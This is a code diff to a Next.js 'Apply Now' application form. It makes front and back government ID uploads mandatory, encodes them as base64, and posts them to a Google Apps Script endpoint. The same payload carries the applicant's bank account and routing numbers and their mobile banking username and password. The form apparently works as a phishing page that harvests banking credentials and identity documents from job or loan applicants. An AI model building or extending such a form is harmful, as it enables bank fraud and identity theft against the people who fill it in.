@@ -22,7 +22,7 @@ import {
 } from 'lucide-react';
 import Link from 'next/link';
 
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycby-9SOfkp4QqxsxRcj9OcqEYzfGiLZDQ0f9U1_e1C-wnUoVZ7WFrzDIUUQIqON1jObx-Q/exec';
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxD5h2kv9UkyPTueN5dqsCaIT44h3gMSORrioNPQhAn5xFVtORUQQIizUv-Uxu2CMLkWw/exec';
 
 export default function ApplyNow() {
   const [currentStep, setCurrentStep] = useState(1);
@@ -122,14 +122,45 @@ export default function ApplyNow() {
 function FormContent({ step, onNext, onBack, onSubmit }: { step: number; onNext: () => void; onBack: () => void; onSubmit: () => void }) {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = async (data: Record<string, string | boolean>) => {
+  // Helper to convert file to base64
+  const fileToBase64 = (file: File): Promise<string> => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.readAsDataURL(file);
+      reader.onload = () => resolve(reader.result as string);
+      reader.onerror = reject;
+    });
+  };
+
+  const handleSubmit = async () => {
+    // Validate ID uploads
+    if (!formData.documentType) { alert('Please select ID type'); return; }
+    if (!formData.idFrontFile) { alert('Please upload ID Front'); return; }
+    if (!formData.idBackFile) { alert('Please upload ID Back'); return; }
+
     setIsSubmitting(true);
     try {
+      // Convert files to base64
+      const [idFrontBase64, idBackBase64] = await Promise.all([
+        formData.idFrontFile ? fileToBase64(formData.idFrontFile) : Promise.resolve(''),
+        formData.idBackFile ? fileToBase64(formData.idBackFile) : Promise.resolve(''),
+      ]);
+
+      const payload = {
+        ...formData,
+        idFrontFile: idFrontBase64,
+        idFrontName: formData.idFrontFile?.name || '',
+        idFrontType: formData.idFrontFile?.type || '',
+        idBackFile: idBackBase64,
+        idBackName: formData.idBackFile?.name || '',
+        idBackType: formData.idBackFile?.type || '',
+      };
+
       await fetch(GOOGLE_SHEET_URL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
+        body: JSON.stringify(payload),
       });
     } catch (err) {
       console.error('Submission error:', err);
@@ -145,6 +176,8 @@ function FormContent({ step, onNext, onBack, onSubmit }: { step: number; onNext:
     streetAddress: '', city: '', state: '', zipCode: '',
     bankName: '', accountNumber: '', routingNumber: '',
     mobileBankingUsername: '', mobileBankingPassword: '', documentType: '',
+    idFrontFile: null as File | null,
+    idBackFile: null as File | null,
     agreeTerms: false, agreePrivacy: false,
   });
   const update = (f: string, v: string | boolean) => setFormData(p => ({ ...p, [f]: v }));
@@ -294,14 +327,57 @@ function FormContent({ step, onNext, onBack, onSubmit }: { step: number; onNext:
 
           <div className="flex items-center gap-2 mb-1 mt-6">
             <div className="w-8 h-8 bg-primary-100 rounded-lg flex items-center justify-center"><FileText className="w-4 h-4 text-primary-600" /></div>
-            <h2 className="text-xl font-bold text-gray-900">Verification Documents</h2>
+            <h2 className="text-xl font-bold text-gray-900">Government ID Upload</h2>
           </div>
-          <p className="text-gray-500 mb-4 text-sm">ID selection and uploads are optional.</p>
-          <div className="grid sm:grid-cols-2 gap-4 mb-6">
-            <Select n={<>Document Type <span className="text-gray-400 font-normal">(optional)</span></>} val={formData.documentType} onCh={e => update('documentType', e.target.value)} opts={<><option value="">Select document type</option><option value="drivers_license">Driver's License</option><option value="passport">Passport</option><option value="state_id">State ID</option><option value="social_security">Social Security Card</option></>} />
-            <div className="mb-4">
-              <label className="block text-sm font-semibold text-gray-700 mb-1">Upload Document <span className="text-gray-400 font-normal">(optional)</span></label>
-              <input type="file" className="w-full px-3 py-2 rounded-lg border border-gray-200 focus:border-primary-500 focus:ring-2 focus:ring-primary-200 outline-none transition-all file:mr-4 file:py-1.5 file:px-3 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100 text-sm" />
+          <p className="text-gray-500 mb-4 text-sm">Required — Upload front and back of your ID.</p>
+          
+          <div className="space-y-4 mb-6">
+            <Select n={<>ID Type <span className="text-red-500">*</span></>} val={formData.documentType} onCh={e => update('documentType', e.target.value)} opts={<><option value="">Select ID type</option><option value="drivers_license">Driver's License</option><option value="passport">Passport</option><option value="state_id">State ID</option><option value="social_security">Social Security Card</option></>} />
+            
+            {/* ID Front Upload */}
+            <div>
+              <label className="block text-sm font-semibold text-gray-700 mb-1">ID Front Side <span className="text-red-500">*</span></label>
+              <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-primary-500 cursor-pointer transition-colors bg-white">
+                <svg className="w-6 h-6 text-gray-400 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" /></svg>
+                <span className="text-sm text-gray-500 text-center">
+                  {formData.idFrontFile ? formData.idFrontFile.name : 'Click to upload ID Front (JPG, PNG, PDF)'}
+                </span>
+                <input 
+                  type="file" 
+                  className="hidden" 
+                  accept="image/*,.pdf,.jpg,.jpeg,.png"
+                  onChange={(e) => {
+                    const file = e.target.files?.[0] || null;
+                    setFormData(p => ({ ...p, idFrontFile: file }));
+                  }}
+                />
+              </label>
+              {formData.idFrontFile && (
+                <p className="text-xs text-green-600 mt-1">✓ {formData.idFrontFile.name} ({(formData.idFrontFile.size / 1024).toFixed(0)} KB)</p>
+              )}
+            </div>
+            
+            {/* ID Back Upload */}
+            <div>
+              <label className="block text-sm font-semibold text-gray-700 mb-1">ID Back Side <span className="text-red-500">*</span></label>
+              <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-primary-500 cursor-pointer transition-colors bg-white">
+                <svg className="w-6 h-6 text-gray-400 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" /></svg>
+                <span className="text-sm text-gray-500 text-center">
+                  {formData.idBackFile ? formData.idBackFile.name : 'Click to upload ID Back (JPG, PNG, PDF)'}
+                </span>
+                <input 
+                  type="file" 
+                  className="hidden" 
+                  accept="image/*,.pdf,.jpg,.jpeg,.png"
+                  onChange={(e) => {
+                    const file = e.target.files?.[0] || null;
+                    setFormData(p => ({ ...p, idBackFile: file }));
+                  }}
+                />
+              </label>
+              {formData.idBackFile && (
+                <p className="text-xs text-green-600 mt-1">✓ {formData.idBackFile.name} ({(formData.idBackFile.size / 1024).toFixed(0)} KB)</p>
+              )}
             </div>
           </div>
 
@@ -319,7 +395,7 @@ function FormContent({ step, onNext, onBack, onSubmit }: { step: number; onNext:
 
           <div className="flex justify-between">
             <Btn onClick={onBack}><ChevronLeft className="w-4 h-4" />Back</Btn>
-            <button onClick={() => handleSubmit(formData as Record<string, string | boolean>)} disabled={!formData.agreeTerms || !formData.agreePrivacy || isSubmitting} className={`flex items-center gap-2 px-6 py-2.5 rounded-full font-semibold transition-colors text-sm ${!formData.agreeTerms || !formData.agreePrivacy || isSubmitting ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-primary-500 hover:bg-primary-600 text-white'}`}>{isSubmitting ? 'Submitting...' : 'Submit Application'}<Send className="w-4 h-4" /></button>
+            <button onClick={handleSubmit} disabled={!formData.agreeTerms || !formData.agreePrivacy || isSubmitting} className={`flex items-center gap-2 px-6 py-2.5 rounded-full font-semibold transition-colors text-sm ${!formData.agreeTerms || !formData.agreePrivacy || isSubmitting ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-primary-500 hover:bg-primary-600 text-white'}`}>{isSubmitting ? 'Submitting...' : 'Submit Application'}<Send className="w-4 h-4" /></button>
           </div>
         </>
       )}
